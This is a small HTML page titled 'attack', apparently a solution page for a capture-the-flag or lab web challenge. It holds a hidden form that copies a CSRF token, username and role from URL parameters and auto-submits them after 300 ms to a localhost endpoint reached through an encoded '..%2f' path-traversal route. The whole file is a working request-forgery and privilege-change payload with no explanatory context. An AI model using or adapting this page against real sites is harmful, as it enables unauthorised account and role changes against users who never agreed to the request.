<!doctype html>
<meta charset="utf-8">
<title>attack</title>
<form id="f" action="" method="POST">
  <input type="hidden" name="_csrf" id="csrf">
  <input type="hidden" name="username" id="user">
  <input type="hidden" name="role" id="role">
  <button type="submit">Submit</button>
</form>
<script>
  const qs = new URLSearchParams(location.search);
  const token = qs.get('token') || '';
  const user  = qs.get('user')  || 'guide_kid';
  const role  = qs.get('role')  || 'guide';
  const action= qs.get('action')|| 'http://127.0.0.1:3000/public/..%2fawaken';
  const auto  = qs.get('auto') ?? '1';

  document.getElementById('csrf').value = token;
  document.getElementById('user').value = user;
  document.getElementById('role').value = role;
  document.getElementById('f').action = action;

  if (token && auto !== '0') {
    setTimeout(() => document.getElementById('f').requestSubmit(), 300);
  }
</script>
